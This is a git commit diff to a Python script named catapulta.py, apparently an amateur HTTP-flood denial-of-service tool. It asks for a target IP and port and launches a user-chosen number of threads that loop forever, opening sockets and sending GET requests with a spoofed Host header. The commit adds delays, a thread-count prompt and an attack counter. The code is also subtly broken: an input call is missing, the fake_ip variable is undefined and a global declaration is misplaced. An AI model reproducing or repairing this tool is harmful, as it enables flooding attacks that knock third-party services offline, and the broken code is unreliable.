ecc4d84e56b0554a77a5dfb0d6518b808d5272d0
V-M4K4R0V <ahmedelmountassir10@gmail.com>
2020-02-02 17:40:02 +0100

    tracking_requ

--- catapulta.py
+++ catapulta.py
@@ -1,9 +1,9 @@
+#ta7ya l toilet
 import socket
 import threading
 import time
 
 
-#ta7ya l toilet
 print('''
  ____  ____   ___  ____                      _       _     _           
 |  _ \|  _ \ / _ \/ ___|       ___  ___ _ __(_)_ __ | |_  | |__  _   _ 
@@ -18,6 +18,7 @@ __     __      __  __ _  _   _  ___  _   ____   _____     __
    \_/        |_|  |_|  |_| |_|\_\  |_| |_| \_\\___/  \_/                                                    
 ''')
 
+time.sleep(2)
 
 print('''
 |-------------------------ATTENTION------------------------------|
@@ -26,22 +27,41 @@ print('''
 |----------------------------------------------------------------|
 ''')
 
+time.sleep(4)
+
+
 #============target info================#
-zombie_IP = input("Enter your target IP : ")
+zombie_IP = input("Enter your target's IP : ")
 zombie_PORT = input("Enter the port : ")
 
+N_thread = int(("choose the number of  requests : "))
+print('''
+#=======================================================#
+#                                                       #
+#  (number of requests < 500) = for low end computers   #
+#  (500 > number of requests) = for high end computers  #
+#                                                       #
+#=======================================================#
+''')
+print("LOADING ...")
+time.sleep(2)
 
 #============Attack func================#
 def attack():
+    attack_num = 0
     #infinity stones
     while True:
         catapulta = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         catapulta.connect((zombie_IP, zombie_PORT))
         catapulta.sendto(("GET /" + zombie_IP + " HTTP/1.1\r\n").encode('ascii'), (zombie_IP, zombie_PORT))
         catapulta.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (zombie_IP, zombie_PORT))
+        #===========info about the number of attacks=============#
+        global attack_num
+        attack_num += 1
+        print(attack_num)
+        
         catapulta.close()
-
 #============number of threads==========#
-for i in range(500):
+for i in range(N_thread):
     N_0F_7 = threading.Thread(target=attack)
     N_0F_7.start()
